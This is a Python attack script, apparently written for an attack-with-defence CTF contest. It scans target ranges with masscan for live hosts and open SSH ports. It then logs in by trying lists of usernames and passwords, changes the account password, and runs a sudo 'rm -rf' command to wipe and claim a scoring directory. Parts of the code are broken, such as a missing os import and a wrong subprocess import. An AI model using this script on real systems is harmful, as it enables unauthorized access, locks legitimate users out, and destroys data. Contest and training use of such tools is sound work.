#!/usr/bin/env python
# coding=utf-8

import sys
import argparse
import paramiko
from asyncio import subprocess
from io import UnsupportedOperation
from pymongo import MongoClient as MC

database_info = {
    'name': 'AWD'
}
mongo_info = {
    'host': 'localhost',
    'port': 27017,
    'password': '',
    'username': 'h4dr@',
    'authSource': database_info.get('name') or 'AWD'
}

informations = {'names': set()}
mc = MC(**mongo_info)
db = mc[database_info.get('name') or 'AWD']

def TurnOn():
    parser = argparse.ArgumentParser()
    parser.add_argument('-e', '--enemise', dest='enemise', nargs='+', required=True, help='enemy 2 destroy')
    parser.add_argument('-o', '--oldpwd', dest='old_pwd', nargs='+', help='the old password')
    parser.add_argument('-n', '--newpwd', dest='new_pwd', help='the new password')
    parser.add_argument('-O', '--out', dest='output',  help='output results file')
    parser.add_argument('-c', '--change', dest='change', action='store_true', help='whether change pwd')
    parser.add_argument('-u', '--usernames', dest='usernames', nargs='+', help='user list')
    #parser.add_argument('-')

    commands = parser.parse_args()
    return commands


async def search_alive_enemy(enemise, loop=None):
    search_command = ['masscan', '--ping', '--rate', '9527', '-oL', '-']
    search_command += enemise
    results = await run(search_command, loop)
    results = await parse_masscan_results(results)
    return results


async def search_weak_enemy(enemise, loop=None):
    search_command = ['masscan', '-p', '22', '--rate', '9527', '-oL', '-']
    search_command += enemise
    results = await run(search_command, loop)
    results = await parse_masscan_results(results)
    return results


async def run(command, loop=None):
    out_buf = err_buf = None
    try:
        process = await subprocess.create_subprocess_exec(*command, stdout=subprocess.PIPE, loop=loop)
        informations['names'].add(process.pid)
        out_buf, err_buf = await process.communicate()
    except UnsupportedOperation:
        print('[-] output file must be a opened file in \'w\' mode')
    except FileNotFoundError:
        print('[-] you\'d best install masscan first')

    return out_buf


async def parse_masscan_results(data):
    if isinstance(data, bytes):
        data = data.decode()
    results = set()
    for line in data.split('\n'):
        if line.startswith('#'):
            continue
        try:
            state, protocol, port, ip, timestamp = line.split(' ')
        except ValueError:
            continue
        if state != 'open':
            continue
        results.add(ip)
    return results


async def record(infos):
    pass


def resharp_results(sshed, pinged):
    results = {}
    for x in sshed:
        results.setdefault(x, ['ssh'])
    for x in pinged:
        results[x] = ['ssh', 'ping'] if results.get(x) else ['ping']

    return results


def change_enemy(enemy, names, old_pwd, new_pwd):
    assert(isinstance(names, list) and isinstance(old_pwd, list))
    status = 0
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for name in names:
        for old in old_pwd:
            try:
                ssh_client.connect(enemy, username=name, password=old)
                payload = f'{old}\n{new_pwd}\n{new_pwd}\n'
                std_in, std_out, std_err = ssh_client.exec_command('passwd')
                std_in.write(payload)

               # payload1 = f"echo '{name}:{new_pwd}' | chpasswd"
               # std_in, std_out, std_err = ssh_client.exec_command(payload1)
                get_score = "sudo rm -rf /Kronos/* && echo 'hail hydra' | sudo tee /Kronos/hydra && sudo chown -R root /Kronos && sudo chmod 444 /Kronos"
                ssh_client.exec_command(get_score)
                ssh_client.close()
            except paramiko.AuthenticationException:
                print(f'[-] error old pwd for user <{name}> at <{enemy}>')
            else:
                status = 1
    return status


def kill_all(lives):
    for name in informations['names']:
        killed = 0
        for x in range(lives):
            if killed:
                try:
                    os.kill(name, 15)
                except ProcessLookupError:
                    killed = 1
                    break
                except BaseException as e:
                    print(f'[-] {e}')
